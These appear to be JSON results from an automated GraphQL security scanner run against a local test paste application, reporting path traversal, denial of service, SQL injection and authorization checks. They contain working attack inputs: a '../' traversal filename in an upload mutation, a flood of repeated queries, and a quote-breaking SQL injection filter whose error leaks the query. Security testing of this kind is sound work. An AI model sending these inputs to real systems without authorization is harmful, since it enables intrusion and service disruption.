{
    "Subscription Test": {
        "status": "Potential Data Leakage",
        "details": {
            "type": "Subscription",
            "field": "paste",
            "query": "subscription { paste { id } }",
            "status_code": 200
        },
        "query": "subscription { paste { id } }",
        "response": {
            "errors": [
                {
                    "message": "Subscription must return Async Iterable or Observable. Received: <Promise at 0x7f945ce49510 fulfilled with <rx.core.anonymousobservable.AnonymousObservable object at 0x7f945ce41810>>"
                }
            ],
            "data": null
        }
    }
}
{
    "Path Traversal Test on uploadPaste": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Path Traversal",
            "severity": "High",
            "description": "Test to identify if file operations allow navigation to parent directories, potentially accessing unauthorized files."
        },
        "query": "\n                mutation {\n                    uploadPaste(filename:\"../../../../../tmp/file.txt\", content:\"test\") {\n                        result\n                    }\n                }\n                ",
        "response": {
            "data": {
                "uploadPaste": {
                    "result": "test"
                }
            }
        }
    }
}
{
    "DoS Attack": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "Denial of Service (DoS)",
            "severity": "High",
            "description": "This test floods the server with repeated requests to check if the server can handle high load without service degradation or crash.",
            "remediation": "Implement rate limiting, use a robust load balancer, and consider auto-scaling."
        },
        "query": "query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }query { systemUpdate }",
        "response": {
            "400": 100
        }
    }
}
{
    "SQL Injection Test on 'pastes' field": {
        "status": "Vulnerability Found",
        "details": {
            "vulnerability": "SQL Injection",
            "severity": "High",
            "description": "Attempts to exploit SQL injection vulnerabilities by injecting malicious SQL code through GraphQL queries.",
            "remediation": "Use parameterized queries or prepared statements to handle user input."
        },
        "query": "\n        query {\n            pastes(filter: \"one two three'\") {\n                title\n                content\n                public\n            }\n        }\n        ",
        "response": {
            "errors": [
                {
                    "message": "(sqlite3.OperationalError) near \"one\": syntax error\n[SQL: SELECT pastes.id AS pastes_id, pastes.title AS pastes_title, pastes.content AS pastes_content, pastes.public AS pastes_public, pastes.user_agent AS pastes_user_agent, pastes.ip_addr AS pastes_ip_addr, pastes.owner_id AS pastes_owner_id, pastes.burn AS pastes_burn \nFROM pastes \nWHERE pastes.public = 0 AND pastes.burn = 0 AND title = 'one two three'' or content = 'one two three'' ORDER BY pastes.id DESC\n LIMIT ? OFFSET ?]\n[parameters: (1000, 0)]\n(Background on this error at: http://sqlalche.me/e/13/e3q8)"
                }
            ],
            "data": {
                "pastes": null
            }
        }
    }
}
{
    "Get Users Test": {
        "status": "Test Not Applicable",
        "details": {
            "description": "Tests if user data for administrators can be fetched without proper authorization.",
            "severity": "High"
        },
        "query": "\n        query getUsers {\n          users(where: {role: ADMINISTRATOR}) {\n            edges {\n              node {\n                userId\n                name\n              }\n            }\n          }\n        }\n        ",
        "response": "400 Client Error: BAD REQUEST for url: http://localhost:5013/graphql"
    }
}
